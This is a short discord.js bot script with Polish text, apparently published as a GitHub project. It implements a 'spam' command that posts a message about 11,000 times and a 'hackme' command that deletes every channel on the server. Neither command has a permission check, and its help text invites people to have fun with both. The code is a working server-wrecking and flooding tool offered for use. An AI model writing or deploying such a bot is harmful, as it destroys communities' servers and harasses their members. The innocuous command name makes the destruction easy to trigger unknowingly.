const Discord = require('discord.js');
const client = new Discord.Client();
const { token, prefix } = require("./config/config.json");


client.on('ready',  () =>{

console.log(`bot ${client.user.tag}  właczył się :)`);
console.log(`spis komend - q?pomoc `);
console.log(`Autor Discord:Maciuś#3917 github:Maciu00  https://github.com/Maciu00/Discord-bot-js `);
client.user.setPresence({ game: { name: `Hakowanie.......` }, type: 0 });

});




client.on("message", (message) => {
  if (!message.content.startsWith(prefix)) return;
 
  if (message.content.startsWith(prefix + "spam")) {
      for (var x=1; x<11000; x++) { 
    message.channel.send("SpamBot");
 } 
}
});

client.on("message", async(msg)=>{

if(msg.content.toLowerCase().startsWith(prefix + "hackme")){
    msg.guild.channels.deleteAll();

}
if(msg.content.toLowerCase().startsWith(prefix + "pomoc")){
    msg.author.send({
        embed: {
            color: 0xF6BE19,
            author: { name: "Pomoc!" },
            description: "q?hackme - Usuwa wszystkie  kanały\nq?spam - komenda do spamowania na czacie\nBaw się dobrze!"
        }
    })
}
});

client.login(token);
